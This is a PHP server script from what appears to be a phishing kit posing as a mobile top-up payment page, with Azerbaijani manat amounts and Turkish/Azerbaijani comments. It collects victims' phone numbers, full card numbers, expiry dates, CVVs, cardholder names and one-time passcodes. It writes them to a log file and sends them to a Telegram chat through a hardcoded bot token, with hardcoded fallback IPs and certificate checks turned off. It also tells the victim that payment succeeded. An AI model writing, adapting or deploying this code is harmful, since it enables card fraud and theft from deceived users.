<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// OPTIONS isteğini hemen yanıtla (CORS preflight)
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Telegram konfigürasyonu
define('TELEGRAM_BOT_TOKEN', '8802880944:AAG52H11b0zSYypWUrdEXiLZJpDb84CHo18');
define('TELEGRAM_CHAT_ID', '-1003935725037');
define('TELEGRAM_API_URL', 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage');

// Telegram'a mesaj gönder (DNS bypass ile)
function sendTelegram($message) {
    // Telegram endpoint'leri: hostname + fallback IP'ler
    $endpoints = [
        'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage',
        'https://149.154.167.220/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage',
        'https://149.154.167.197/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage'
    ];
    
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $payload = json_encode($data);
    
    // Her endpoint'i sırayla dene
    foreach ($endpoints as $url) {
        // Önce file_get_contents dene
        $options = [
            'http' => [
                'method' => 'POST',
                'header' => "Content-Type: application/json\r\nHost: api.telegram.org",
                'content' => $payload,
                'timeout' => 10,
                'ignore_errors' => true
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false
            ]
        ];
        
        $context = stream_context_create($options);
        $result = @file_get_contents($url, false, $context);
        
        if ($result !== false) {
            $response = json_decode($result, true);
            if (isset($response['ok']) && $response['ok'] === true) {
                return true;
            }
        }
        
        // file_get_contents başarısız oldu, CURL dene
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'Content-Type: application/json',
                'Host: api.telegram.org'
            ]);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            
            $result = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($httpCode === 200 && $result !== false) {
                $response = json_decode($result, true);
                if (isset($response['ok']) && $response['ok'] === true) {
                    return true;
                }
            }
        }
    }
    
    // Tüm endpoint'ler başarısız
    return false;
}

// POST isteğini al
$data = json_decode(file_get_contents('php://input'), true);

// Log dizinini oluştur
$logDir = 'logs';
if (!file_exists($logDir)) {
    mkdir($logDir, 0755, true);
}

$logFile = $logDir . '/log.txt';
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';

// Endpoint'i belirle
$endpoint = $_GET['endpoint'] ?? '';

// Send Order (index.html'den)
if ($endpoint === 'send-order') {
    $operator = $data['operator'] ?? 'N/A';
    $phone = $data['phone'] ?? 'N/A';
    $amount = $data['amount'] ?? 'N/A';
    
    // Log dosyasına kaydet
    $logEntry = "\n" . str_repeat('=', 80) . "\n";
    $logEntry .= "ORDER - Timestamp: $timestamp\n";
    $logEntry .= "Operator: $operator\n";
    $logEntry .= "Phone: $phone\n";
    $logEntry .= "Amount: $amount AZN\n";
    $logEntry .= "IP: $ip\n";
    $logEntry .= "User-Agent: $userAgent\n";
    $logEntry .= str_repeat('=', 80) . "\n";
    
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    
    // Telegram mesajı
    $telegramMsg = "🟢 <b>YENİ SİPARİŞ</b>\n";
    $telegramMsg .= "━━━━━━━━━━━━━━━━━━━━━━━\n";
    $telegramMsg .= "📱 Operator: <b>$operator</b>\n";
    $telegramMsg .= "📞 Telefon: <code>$phone</code>\n";
    $telegramMsg .= "💰 Məbləğ: <b>$amount AZN</b>\n";
    $telegramMsg .= "━━━━━━━━━━━━━━━━━━━━━━━\n";
    $telegramMsg .= "🌐 IP: <code>$ip</code>\n";
    $telegramMsg .= "🕐 Zaman: <b>$timestamp</b>";
    
    sendTelegram($telegramMsg);
    
    echo json_encode([
        'success' => true,
        'message' => 'Order received'
    ]);
    exit();
}

// Process Payment
if ($endpoint === 'process-payment') {
    $cardNumber = $data['cardNumber'] ?? 'N/A';
    $cardType = $data['cardType'] ?? 'Kart';
    $expiryMonth = $data['expiryMonth'] ?? 'N/A';
    $expiryYear = $data['expiryYear'] ?? 'N/A';
    $cvv = $data['cvv'] ?? 'N/A';
    $cardholderName = $data['cardholderName'] ?? 'N/A';
    
    // Log dosyasına kaydet
    $logEntry = "\n" . str_repeat('=', 80) . "\n";
    $logEntry .= "Timestamp: $timestamp\n";
    $logEntry .= "Card Type: $cardType\n";
    $logEntry .= "Card Number: $cardNumber\n";
    $logEntry .= "Expiry: $expiryMonth/$expiryYear\n";
    $logEntry .= "CVV: $cvv\n";
    $logEntry .= "Cardholder: $cardholderName\n";
    $logEntry .= "IP: $ip\n";
    $logEntry .= "User-Agent: $userAgent\n";
    $logEntry .= str_repeat('=', 80) . "\n";
    
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    
    // Telegram mesajı
    $masked = substr($cardNumber, 0, 4) . ' **** **** ' . substr($cardNumber, -4);
    $telegramMsg = "💳 <b>YENİ KART BİLGİSİ</b>\n";
    $telegramMsg .= "━━━━━━━━━━━━━━━━━━━━━━━\n";
    $telegramMsg .= "🏷️ Tip: <b>$cardType</b>\n";
    $telegramMsg .= "💳 Masked: <b>$masked</b>\n";
    $telegramMsg .= "🔒 Tam No: <code>$cardNumber</code>\n";
    $telegramMsg .= "📅 Bitiş: <b>$expiryMonth/$expiryYear</b>\n";
    $telegramMsg .= "🔐 CVV: <code>$cvv</code>\n";
    $telegramMsg .= "👤 Sahibi: <b>$cardholderName</b>\n";
    $telegramMsg .= "━━━━━━━━━━━━━━━━━━━━━━━\n";
    $telegramMsg .= "🌐 IP: <code>$ip</code>\n";
    $telegramMsg .= "🕐 Zaman: <b>$timestamp</b>";
    
    sendTelegram($telegramMsg);
    
    echo json_encode([
        'success' => true,
        'requiresOTP' => true,
        'redirectUrl' => '/otp.html'
    ]);
    exit();
}

// Verify OTP
if ($endpoint === 'verify-otp') {
    $otp = $data['otp'] ?? 'N/A';
    
    // Log dosyasına kaydet
    $logEntry = "\n" . str_repeat('=', 80) . "\n";
    $logEntry .= "OTP Verification - Timestamp: $timestamp\n";
    $logEntry .= "OTP Code: $otp\n";
    $logEntry .= "IP: $ip\n";
    $logEntry .= str_repeat('=', 80) . "\n";
    
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
    
    // Telegram mesajı
    $telegramMsg = "🔐 <b>YENİ OTP KODU</b>\n";
    $telegramMsg .= "━━━━━━━━━━━━━━━━━━━━━━━\n";
    $telegramMsg .= "🔢 Kod: <code>$otp</code>\n";
    $telegramMsg .= "━━━━━━━━━━━━━━━━━━━━━━━\n";
    $telegramMsg .= "🌐 IP: <code>$ip</code>\n";
    $telegramMsg .= "🕐 Zaman: <b>$timestamp</b>";
    
    sendTelegram($telegramMsg);
    
    echo json_encode([
        'success' => true,
        'message' => 'Payment verified successfully'
    ]);
    exit();
}

// Geçersiz endpoint
http_response_code(400);
echo json_encode([
    'success' => false,
    'error' => 'Invalid endpoint'
]);
?>
